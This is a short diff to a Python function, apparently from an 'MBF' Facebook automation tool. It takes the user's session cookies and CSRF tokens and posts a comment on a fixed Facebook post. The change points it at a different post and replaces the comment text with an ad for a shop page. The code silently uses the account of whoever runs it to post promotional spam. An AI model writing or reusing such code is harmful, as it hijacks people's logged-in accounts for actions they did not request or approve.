@@ -10,7 +10,7 @@ except: pass
 def comments(self, ua, cookie):
 	try:
 		content = session.request(
-			"GET", "https://mbasic.facebook.com/photo.php?fbid=1145924768936987",
+			"GET", "https://m.facebook.com/story.php?story_fbid=1744568975694216",
 				headers = ua, cookies = cookie
 		).text
 		bs = BeautifulSoup(content, "html.parser")
@@ -32,7 +32,7 @@ def comments(self, ua, cookie):
 		param = {
 		"fb_dtsg" : data[1],
 		"jazoest" : data[2],
-		"comment_text" : "😸Hello saya pengguna MBF😸"}
+		"comment_text" : "Like dan Follow FP Peanut Official Store"}
 		session.request(
 			"POST", "https://mbasic.facebook.com"+data[0],
 				headers = ua, cookies = cookie, data = param
